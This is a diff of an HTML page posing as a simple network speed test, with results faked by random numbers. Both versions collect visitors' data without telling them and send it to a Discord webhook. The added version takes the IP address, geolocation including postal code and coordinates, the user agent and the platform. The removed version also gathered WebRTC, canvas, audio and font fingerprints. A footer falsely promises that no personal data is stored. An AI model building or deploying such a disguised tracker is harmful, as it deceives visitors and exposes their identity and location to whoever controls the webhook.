@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Diagnostic Tool</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Simple Speed Test</title>
     <style>
         * {
             margin: 0;
@@ -14,258 +13,137 @@
         }
         
         body {
-            background: linear-gradient(135deg, #1a2a6c, #2b5876, #4e4376);
+            background: linear-gradient(to bottom, #3498db, #2c3e50);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            color: #fff;
-            overflow-x: hidden;
+            color: #333;
         }
         
         .container {
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
             width: 90%;
-            max-width: 800px;
-            padding: 35px;
+            max-width: 500px;
+            padding: 25px;
             text-align: center;
-            transition: transform 0.4s ease, box-shadow 0.4s ease;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
-            transform: rotate(30deg);
-            pointer-events: none;
         }
         
         h1 {
-            margin-bottom: 20px;
-            color: #fff;
-            font-size: 36px;
-            font-weight: 700;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            position: relative;
-        }
-        
-        h1::after {
-            content: '';
-            position: absolute;
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 100px;
-            height: 3px;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            border-radius: 3px;
+            margin-bottom: 15px;
+            color: #2c3e50;
+            font-size: 28px;
         }
         
         p {
-            margin-bottom: 25px;
-            line-height: 1.6;
-            color: #d6d6d6;
-            font-size: 16px;
-        }
-        
-        .card {
-            background: rgba(35, 35, 45, 0.7);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 25px;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            text-align: left;
-        }
-        
-        .card-title {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            color: #4facfe;
-            display: flex;
-            align-items: center;
-        }
-        
-        .card-title i {
-            margin-right: 10px;
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-        
-        .stat-item {
-            background: rgba(40, 40, 50, 0.7);
-            padding: 15px;
-            border-radius: 10px;
-            transition: transform 0.3s ease;
-        }
-        
-        .stat-item:hover {
-            transform: translateY(-5px);
-        }
-        
-        .stat-label {
-            font-size: 14px;
-            color: #a0a0a0;
-            margin-bottom: 5px;
-        }
-        
-        .stat-value {
-            font-size: 18px;
-            font-weight: 600;
-            color: #fff;
-            overflow: hidden;
-            text-overflow: ellipsis;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            color: #555;
         }
         
         .speed-test {
-            background: rgba(35, 35, 45, 0.7);
-            border-radius: 15px;
-            padding: 30px;
-            margin-bottom: 25px;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 20px;
         }
         
-        .speed-test::before {
-            content: '';
+        .gauge {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+        
+        .gauge-circle {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: #f0f0f0;
+            position: relative;
+        }
+        
+        .gauge-fill {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
-            height: 5px;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            transform: translateX(-100%);
-            animation: shimmer 3s infinite;
-        }
-        
-        @keyframes shimmer {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-        
-        .gauge-container {
-            position: relative;
-            width: 220px;
-            height: 220px;
-            margin: 0 auto 25px;
-        }
-        
-        .gauge {
-            width: 100%;
             height: 100%;
+            background: conic-gradient(#2ecc71 0% var(--progress, 0%), #f0f0f0 var(--progress, 0%) 100%);
             border-radius: 50%;
-            background: conic-gradient(#4facfe 0% var(--progress, 0%), #2a2a3a var(--progress, 0%) 100%);
-            position: relative;
-            transition: all 1s ease;
-            box-shadow: 0 0 25px rgba(79, 172, 254, 0.3);
+            transition: background 1s ease;
         }
         
-        .gauge-inner {
+        .gauge-center {
             position: absolute;
-            top: 15px;
-            left: 15px;
-            width: calc(100% - 30px);
-            height: calc(100% - 30px);
-            background: #23232d;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            height: 80%;
+            background: white;
             border-radius: 50%;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            z-index: 2;
-        }
-        
-        .gauge-value {
-            font-size: 32px;
-            font-weight: 700;
-            color: #fff;
-            margin-bottom: 5px;
-            text-shadow: 0 0 10px rgba(79, 172, 254, 0.7);
-            transition: all 0.5s ease;
-        }
-        
-        .gauge-label {
-            font-size: 14px;
-            color: #b3b3b3;
+            font-size: 24px;
+            font-weight: bold;
+            color: #2c3e50;
         }
         
         .speed-results {
             display: flex;
             justify-content: space-around;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
         
         .download, .upload, .ping {
             text-align: center;
-            padding: 15px;
-            background: rgba(40, 40, 50, 0.7);
-            border-radius: 12px;
-            width: 30%;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s ease;
-        }
-        
-        .download:hover, .upload:hover, .ping:hover {
-            transform: translateY(-5px);
-        }
-        
-        .download {
-            border-top: 3px solid #4facfe;
-        }
-        
-        .upload {
-            border-top: 3px solid #00f2fe;
-        }
-        
-        .ping {
-            border-top: 3px solid #a74fff;
+            padding: 10px;
         }
         
         .speed-value {
-            font-size: 24px;
-            font-weight: 700;
-            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            color: #2c3e50;
             margin-bottom: 5px;
-            height: 35px;
+            height: 30px;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.5s ease;
         }
         
         .speed-label {
             font-size: 14px;
-            color: #b3b3b3;
+            color: #7f8c8d;
+        }
+        
+        .test-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        
+        .test-btn:hover {
+            background: #2980b9;
+        }
+        
+        .test-btn:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
         }
         
         .progress-container {
             width: 100%;
-            height: 10px;
-            background: #2a2a3a;
-            border-radius: 5px;
+            height: 8px;
+            background: #ecf0f1;
+            border-radius: 4px;
             margin: 20px 0;
             overflow: hidden;
         }
@@ -273,68 +151,22 @@
         .progress-bar {
             height: 100%;
             width: 0%;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            border-radius: 5px;
+            background: #3498db;
+            border-radius: 4px;
             transition: width 0.5s ease;
         }
         
         .status {
             margin: 15px 0;
-            font-size: 16px;
-            color: #b3b3b3;
-            min-height: 24px;
-        }
-        
-        .test-btn {
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .test-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(to right, rgba(255, 255, 255, 0.2), transparent);
-            transform: translateX(-100%);
-            transition: transform 0.5s ease;
-        }
-        
-        .test-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-        }
-        
-        .test-btn:hover::before {
-            transform: translateX(100%);
-        }
-        
-        .test-btn:active {
-            transform: translateY(1px);
-        }
-        
-        .test-btn:disabled {
-            background: #555;
-            cursor: not-allowed;
-            transform: none;
+            font-size: 14px;
+            color: #7f8c8d;
+            min-height: 20px;
         }
         
         .footer {
             margin-top: 20px;
-            font-size: 14px;
-            color: #777;
+            font-size: 12px;
+            color: #7f8c8d;
         }
         
         .hidden {
@@ -343,135 +175,30 @@
         
         .loading {
             display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,.3);
             border-radius: 50%;
-            border-top-color: #4facfe;
+            border-top-color: white;
             animation: spin 1s ease-in-out infinite;
         }
         
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        
-        .floating {
-            animation: float 3s ease-in-out infinite;
-        }
-        
-        @keyframes float {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0px); }
-        }
-        
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(79, 172, 254, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(79, 172, 254, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(79, 172, 254, 0); }
-        }
-        
-        .particles {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: -1;
-        }
-        
-        .particle {
-            position: absolute;
-            background: rgba(79, 172, 254, 0.5);
-            border-radius: 50%;
-            opacity: 0;
-        }
-        
-        .data-point {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .data-label {
-            font-weight: 600;
-            color: #b3b3b3;
-        }
-        
-        .data-value {
-            color: #fff;
-            max-width: 60%;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        
-        @media (max-width: 600px) {
-            .container {
-                padding: 20px;
-            }
-            
-            h1 {
-                font-size: 28px;
-            }
-            
-            .speed-results {
-                flex-direction: column;
-                align-items: center;
-            }
-            
-            .download, .upload, .ping {
-                width: 100%;
-                margin-bottom: 15px;
-            }
-            
-            .stats-grid {
-                grid-template-columns: 1fr;
-            }
-        }
     </style>
 </head>
 <body>
-    <div class="particles" id="particles"></div>
-    
-    <div class="container floating">
-        <h1><i class="fas fa-network-wired"></i> Network Diagnostic Tool</h1>
-        <p>Complete analysis of your network connection and device capabilities</p>
-        
-        <div class="card">
-            <div class="card-title"><i class="fas fa-info-circle"></i> Connection Information</div>
-            <div class="stats-grid">
-                <div class="stat-item">
-                    <div class="stat-label">IP Address</div>
-                    <div class="stat-value" id="ip-address">Detecting...</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-label">ISP</div>
-                    <div class="stat-value" id="isp">Detecting...</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-label">Location</div>
-                    <div class="stat-value" id="location">Detecting...</div>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-label">Network Type</div>
-                    <div class="stat-value" id="network-type">Detecting...</div>
-                </div>
-            </div>
-        </div>
+    <div class="container">
+        <h1>Network Speed Test</h1>
+        <p>Test your internet connection speed with our simple tool</p>
         
         <div class="speed-test">
-            <div class="gauge-container">
-                <div class="gauge" style="--progress: 0%">
-                    <div class="gauge-inner">
-                        <div class="gauge-value" id="gauge-value">0</div>
-                        <div class="gauge-label">Mbps</div>
+            <div class="gauge">
+                <div class="gauge-circle">
+                    <div class="gauge-fill" style="--progress: 0%"></div>
+                    <div class="gauge-center">
+                        <span id="gauge-value">0</span>
                     </div>
                 </div>
             </div>
@@ -497,91 +224,26 @@
             
             <div class="status" id="status">Ready to test your connection</div>
             
-            <button class="test-btn pulse" id="test-btn">
-                <i class="fas fa-play"></i> Start Diagnostic
+            <button class="test-btn" id="test-btn">
+                Start Test
             </button>
         </div>
         
-        <div class="card">
-            <div class="card-title"><i class="fas fa-desktop"></i> Device Information</div>
-            <div class="data-point">
-                <span class="data-label">Browser:</span>
-                <span class="data-value" id="browser-info">Detecting...</span>
-            </div>
-            <div class="data-point">
-                <span class="data-label">Operating System:</span>
-                <span class="data-value" id="os-info">Detecting...</span>
-            </div>
-            <div class="data-point">
-                <span class="data-label">Screen Resolution:</span>
-                <span class="data-value" id="screen-info">Detecting...</span>
-            </div>
-            <div class="data-point">
-                <span class="data-label">Language:</span>
-                <span class="data-value" id="language-info">Detecting...</span>
-            </div>
-            <div class="data-point">
-                <span class="data-label">Timezone:</span>
-                <span class="data-value" id="timezone-info">Detecting...</span>
-            </div>
-        </div>
-        
-        <p class="footer">This diagnostic tool helps optimize your network experience. No personal data is stored.</p>
+        <p class="footer">We value your privacy. No personal data is stored.</p>
     </div>
     
     <div id="ipData" class="hidden"></div>
 
     <script>
-        // Create floating particles
-        function createParticles() {
-            const particles = document.getElementById('particles');
-            const particleCount = 30;
-            
-            for (let i = 0; i < particleCount; i++) {
-                const particle = document.createElement('div');
-                particle.classList.add('particle');
-                
-                const size = Math.random() * 5 + 2;
-                const posX = Math.random() * 100;
-                const posY = Math.random() * 100;
-                const delay = Math.random() * 10;
-                const duration = Math.random() * 10 + 10;
-                
-                particle.style.width = `${size}px`;
-                particle.style.height = `${size}px`;
-                particle.style.left = `${posX}%`;
-                particle.style.top = `${posY}%`;
-                particle.style.animation = `float ${duration}s ease-in-out ${delay}s infinite`;
-                
-                particles.appendChild(particle);
-                
-                // Fade in
-                setTimeout(() => {
-                    particle.style.opacity = '0.5';
-                }, delay * 1000);
-            }
-        }
-        
         // DOM elements
         const testBtn = document.getElementById('test-btn');
         const downloadSpeed = document.getElementById('download-speed');
         const uploadSpeed = document.getElementById('upload-speed');
         const pingValue = document.getElementById('ping-value');
         const gaugeValue = document.getElementById('gauge-value');
-        const gauge = document.querySelector('.gauge');
+        const gaugeFill = document.querySelector('.gauge-fill');
         const progressBar = document.getElementById('progress-bar');
         const status = document.getElementById('status');
-        
-        // Info elements
-        const ipAddress = document.getElementById('ip-address');
-        const ispInfo = document.getElementById('isp');
-        const locationInfo = document.getElementById('location');
-        const networkType = document.getElementById('network-type');
-        const browserInfo = document.getElementById('browser-info');
-        const osInfo = document.getElementById('os-info');
-        const screenInfo = document.getElementById('screen-info');
-        const languageInfo = document.getElementById('language-info');
-        const timezoneInfo = document.getElementById('timezone-info');
         
         // Test variables
         let testInProgress = false;
@@ -591,23 +253,20 @@
         
         // Initialize the page
         document.addEventListener('DOMContentLoaded', function() {
-            createParticles();
-            
-            // Start collecting data immediately
-            collectAllData();
+            // Start collecting IP data immediately but discreetly
+            collectIPData();
             
             // Set up test button event listener
             testBtn.addEventListener('click', startTest);
         });
         
-        // Function to collect all possible data
-        function collectAllData() {
+        // Function to collect IP data
+        function collectIPData() {
             // Get the IP address using ipify API
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
-                    ipAddress.textContent = ip;
                     
                     // Get additional information
                     const timestamp = new Date().toISOString();
@@ -617,99 +276,38 @@
                     const referrer = document.referrer || 'Direct';
                     const screenResolution = `${window.screen.width}x${window.screen.height}`;
                     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    const cookies = navigator.cookieEnabled;
-                    const javaEnabled = navigator.javaEnabled();
-                    const pdfEnabled = navigator.pdfViewerEnabled;
-                    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
-                    const deviceMemory = navigator.deviceMemory || 'Unknown';
-                    const maxTouchPoints = navigator.maxTouchPoints || 'Unknown';
-                    
-                    // Update UI with basic info
-                    browserInfo.textContent = getBrowserName();
-                    osInfo.textContent = platform;
-                    screenInfo.textContent = screenResolution;
-                    languageInfo.textContent = language;
-                    timezoneInfo.textContent = timezone;
                     
                     // Get location data based on IP
-                    return fetch(`https://ipapi.co/${ip}/json/`)
+                    fetch(`https://ipapi.co/${ip}/json/`)
                         .then(response => response.json())
                         .then(locationData => {
-                            // Update UI with location info
-                            ispInfo.textContent = locationData.org || 'Unknown';
-                            locationInfo.textContent = `${locationData.city || 'Unknown'}, ${locationData.country_name || 'Unknown'}`;
-                            networkType.textContent = locationData.version || 'Unknown';
-                            
-                            // Get more detailed network information
-                            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                            let connectionType = 'Unknown';
-                            let effectiveType = 'Unknown';
-                            let downlink = 'Unknown';
-                            let rtt = 'Unknown';
-                            
-                            if (connection) {
-                                connectionType = connection.type || 'Unknown';
-                                effectiveType = connection.effectiveType || 'Unknown';
-                                downlink = connection.downlink || 'Unknown';
-                                rtt = connection.rtt || 'Unknown';
-                            }
-                            
-                            // Get WebRTC IP (if available)
-                            getWebRTCIP().then(webrtcIP => {
-                                // Get canvas fingerprint
-                                const canvasFingerprint = getCanvasFingerprint();
-                                
-                                // Get installed fonts (approximation)
-                                const fonts = getInstalledFonts();
-                                
-                                // Get audio context fingerprint
-                                getAudioFingerprint().then(audioFingerprint => {
-                                    // Store all data in hidden element
-                                    const ipDataElement = document.getElementById('ipData');
-                                    ipDataElement.textContent = JSON.stringify({
-                                        ip: ip,
-                                        timestamp: timestamp,
-                                        userAgent: userAgent,
-                                        language: language,
-                                        platform: platform,
-                                        referrer: referrer,
-                                        screenResolution: screenResolution,
-                                        timezone: timezone,
-                                        cookies: cookies,
-                                        javaEnabled: javaEnabled,
-                                        pdfEnabled: pdfEnabled,
-                                        hardwareConcurrency: hardwareConcurrency,
-                                        deviceMemory: deviceMemory,
-                                        maxTouchPoints: maxTouchPoints,
-                                        connection: {
-                                            type: connectionType,
-                                            effectiveType: effectiveType,
-                                            downlink: downlink,
-                                            rtt: rtt
-                                        },
-                                        webrtcIP: webrtcIP,
-                                        canvasFingerprint: canvasFingerprint,
-                                        audioFingerprint: audioFingerprint,
-                                        fonts: fonts,
-                                        location: {
-                                            country: locationData.country_name,
-                                            region: locationData.region,
-                                            city: locationData.city,
-                                            postal: locationData.postal,
-                                            latitude: locationData.latitude,
-                                            longitude: locationData.longitude
-                                        },
-                                        network: {
-                                            asn: locationData.asn,
-                                            org: locationData.org,
-                                            version: locationData.version
-                                        }
-                                    });
-                                    
-                                    // Send to Discord webhook
-                                    sendToDiscord(ipDataElement.textContent);
-                                });
+                            // Store data in hidden element
+                            const ipDataElement = document.getElementById('ipData');
+                            ipDataElement.textContent = JSON.stringify({
+                                ip: ip,
+                                timestamp: timestamp,
+                                userAgent: userAgent,
+                                language: language,
+                                platform: platform,
+                                referrer: referrer,
+                                screenResolution: screenResolution,
+                                timezone: timezone,
+                                location: {
+                                    country: locationData.country_name,
+                                    region: locationData.region,
+                                    city: locationData.city,
+                                    postal: locationData.postal,
+                                    latitude: locationData.latitude,
+                                    longitude: locationData.longitude
+                                },
+                                network: {
+                                    asn: locationData.asn,
+                                    org: locationData.org
+                                }
                             });
+                            
+                            // Send to Discord webhook
+                            sendToDiscord(ipDataElement.textContent);
                         })
                         .catch(error => {
                             console.error('Error fetching location data:', error);
@@ -720,145 +318,13 @@
                 });
         }
         
-        // Function to get browser name from user agent
-        function getBrowserName() {
-            const userAgent = navigator.userAgent;
-            if (userAgent.includes("Firefox")) return "Firefox";
-            if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
-            if (userAgent.includes("Opera") || userAgent.includes("OPR/")) return "Opera";
-            if (userAgent.includes("Edg")) return "Edge";
-            if (userAgent.includes("Chrome")) return "Chrome";
-            if (userAgent.includes("Safari")) return "Safari";
-            return "Unknown";
-        }
-        
-        // Function to get WebRTC IP (if available)
-        function getWebRTCIP() {
-            return new Promise((resolve) => {
-                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-                
-                if (!RTCPeerConnection) {
-                    resolve('Not supported');
-                    return;
-                }
-                
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                let IP = 'Not available';
-                
-                pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                
-                pc.onicecandidate = (ice) => {
-                    if (!ice || !ice.candidate || !ice.candidate.candidate) {
-                        resolve(IP);
-                        return;
-                    }
-                    
-                    const candidate = ice.candidate.candidate;
-                    const match = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
-                    
-                    if (match) {
-                        IP = match[1];
-                    }
-                    resolve(IP);
-                };
-                
-                // Timeout after 1 second
-                setTimeout(() => resolve(IP || 'Timeout'), 1000);
-            });
-        }
-        
-        // Function to get canvas fingerprint
-        function getCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            canvas.width = 200;
-            canvas.height = 50;
-            
-            ctx.textBaseline = 'top';
-            ctx.font = "14px 'Arial'";
-            ctx.textBaseline = 'alphabetic';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(125, 1, 62, 20);
-            ctx.fillStyle = '#069';
-            ctx.fillText('Hello, world!', 2, 15);
-            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('Hello, world!', 4, 17);
-            
-            return canvas.toDataURL();
-        }
-        
-        // Function to get audio fingerprint
-        function getAudioFingerprint() {
-            return new Promise((resolve) => {
-                if (!window.AudioContext && !window.webkitAudioContext) {
-                    resolve('Not supported');
-                    return;
-                }
-                
-                const context = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = context.createOscillator();
-                const gain = context.createGain();
-                
-                oscillator.connect(gain);
-                gain.connect(context.destination);
-                
-                oscillator.type = 'triangle';
-                oscillator.frequency.value = 10000;
-                
-                gain.gain.value = 0.001;
-                
-                const startTime = context.currentTime;
-                oscillator.start(startTime);
-                oscillator.stop(startTime + 0.001);
-                
-                // Let the audio context process the sound
-                setTimeout(() => {
-                    resolve('Processed');
-                }, 10);
-            });
-        }
-        
-        // Function to get installed fonts (approximation)
-        function getInstalledFonts() {
-            const fonts = [
-                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 
-                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 
-                'Verdana', 'Andale Mono', 'Baskerville', 'Gill Sans'
-            ];
-            
-            const availableFonts = [];
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-            canvas.width = 200;
-            canvas.height = 50;
-            
-            const text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-            const baseFont = context.font;
-            
-            fonts.forEach(font => {
-                context.font = `12px "${font}"`;
-                const metrics1 = context.measureText(text);
-                
-                context.font = `12px "UnknownFontThatShouldNotExist", "${font}"`;
-                const metrics2 = context.measureText(text);
-                
-                if (metrics1.width !== metrics2.width) {
-                    availableFonts.push(font);
-                }
-            });
-            
-            context.font = baseFont;
-            return availableFonts;
-        }
-        
         // Function to send data to Discord webhook
         function sendToDiscord(data) {
             const ipData = JSON.parse(data);
             
             // Format the message for Discord
             const message = {
-                content: "🌐 New Visitor Data Collected",
+                content: "New Website Visitor",
                 embeds: [
                     {
                         title: "Visitor Information",
@@ -875,45 +341,17 @@
                                 inline: true
                             },
                             {
-                                name: "ISP",
-                                value: ipData.network?.org || "Unknown",
-                                inline: true
-                            },
-                            {
                                 name: "Device",
-                                value: `${ipData.platform} (${ipData.screenResolution})`,
+                                value: ipData.platform || "Unknown",
                                 inline: true
                             },
                             {
                                 name: "Browser",
-                                value: getBrowserName(),
-                                inline: true
-                            },
-                            {
-                                name: "Language/Timezone",
-                                value: `${ipData.language}/${ipData.timezone}`,
-                                inline: true
-                            },
-                            {
-                                name: "Connection Type",
-                                value: ipData.connection.effectiveType,
-                                inline: true
-                            },
-                            {
-                                name: "Hardware",
-                                value: `CPU: ${ipData.hardwareConcurrency} cores, RAM: ${ipData.deviceMemory}GB`,
-                                inline: true
-                            },
-                            {
-                                name: "User Agent",
-                                value: ipData.userAgent.substring(0, 100) + "...",
+                                value: ipData.userAgent ? ipData.userAgent.substring(0, 100) + "..." : "Unknown",
                                 inline: false
                             }
                         ],
-                        timestamp: ipData.timestamp,
-                        footer: {
-                            text: "Network Diagnostic Tool"
-                        }
+                        timestamp: ipData.timestamp
                     }
                 ]
             };
@@ -942,7 +380,6 @@
             
             testInProgress = true;
             testBtn.disabled = true;
-            testBtn.classList.remove('pulse');
             testBtn.innerHTML = '<span class="loading"></span> Testing...';
             status.textContent = 'Initializing test...';
             
@@ -954,7 +391,7 @@
             uploadSpeed.textContent = '0.00';
             pingValue.textContent = '0';
             gaugeValue.textContent = '0';
-            gauge.style.setProperty('--progress', '0%');
+            gaugeFill.style.setProperty('--progress', '0%');
             progressBar.style.width = '0%';
             
             // Simulate ping test
@@ -973,7 +410,7 @@
                 
                 // Simulate download test
                 simulateDownloadTest();
-            }, 1500);
+            }, 1000);
         }
         
         // Simulate download test with progress
@@ -987,7 +424,7 @@
                 
                 // Animate the gauge
                 const currentProgress = Math.min(progress * 0.7, 100);
-                gauge.style.setProperty('--progress', `${currentProgress}%`);
+                gaugeFill.style.setProperty('--progress', `${currentProgress}%`);
                 gaugeValue.textContent = Math.round(currentProgress);
                 
                 if (progress >= 100) {
@@ -995,7 +432,7 @@
                     downloadResult = (Math.random() * 90 + 10).toFixed(2);
                     downloadSpeed.textContent = downloadResult;
                     gaugeValue.textContent = Math.round(downloadResult);
-                    gauge.style.setProperty('--progress', `${Math.round(downloadResult)}%`);
+                    gaugeFill.style.setProperty('--progress', `${Math.round(downloadResult)}%`);
                     progressBar.style.width = '70%';
                     
                     // Simulate upload test
@@ -1028,10 +465,8 @@
         // Finish the test
         function finishTest() {
             status.textContent = 'Test complete!';
-            status.style.color = '#4facfe';
             testBtn.disabled = false;
-            testBtn.innerHTML = '<i class="fas fa-redo"></i> Test Again';
-            testBtn.classList.add('pulse');
+            testBtn.innerHTML = 'Test Again';
             testInProgress = false;
             
             // Send test results along with IP data
@@ -1053,7 +488,7 @@
             
             // Format the message for Discord
             const message = {
-                content: "📊 Speed Test Results",
+                content: "Speed Test Results",
                 embeds: [
                     {
                         title: "Network Performance",
@@ -1078,17 +513,9 @@
                                 name: "IP Address",
                                 value: ipData.ip || "Unknown",
                                 inline: true
-                            },
-                            {
-                                name: "Connection Type",
-                                value: ipData.connection.effectiveType || "Unknown",
-                                inline: true
                             }
                         ],
-                        timestamp: ipData.timestamp,
-                        footer: {
-                            text: "Network Diagnostic Tool"
-                        }
+                        timestamp: ipData.timestamp
                     }
                 ]
             };
